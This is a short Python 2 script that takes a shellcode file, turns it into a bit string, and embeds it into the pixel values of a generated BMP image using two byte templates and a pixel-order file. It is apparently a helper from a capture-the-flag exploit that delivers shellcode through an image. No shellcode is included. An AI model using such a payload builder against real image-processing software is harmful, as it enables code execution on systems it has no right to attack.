#!/usr/bin/env python2

import os, sys, PIL
from PIL import Image

if len(sys.argv) < 4:
    print 'usage: %s <0.bin> <1.bin> <shellcode>'
    sys.exit(0)

shellcode = open(sys.argv[3]).read()

bits_ary = map(lambda _: bin(ord(_))[2:], shellcode)

bits = ''
for i in bits_ary:
    bits += '0' * (8 - len(i)) + i

while len(bits) < 8 * 24 * 8:
    bits += '0'

print '%d bytes' % (len(bits)/8)
print bits

m = Image.new('RGB', (512, 64))

seq = open('seq.txt')

mp = [open(sys.argv[1]).read(), open(sys.argv[2]).read()]

for i in range(len(bits)):
    b = int(bits[i])

    for j in range(64):
        line = seq.readline()
        y, x, k = map(int, line.strip().split(' '))
        #print x, y
        pix = m.getpixel((x,y))
        pix = list(pix)
        pix[k] = ord(mp[b][j])
        m.putpixel((x, y), tuple(pix))
    
m.save('out.bmp')

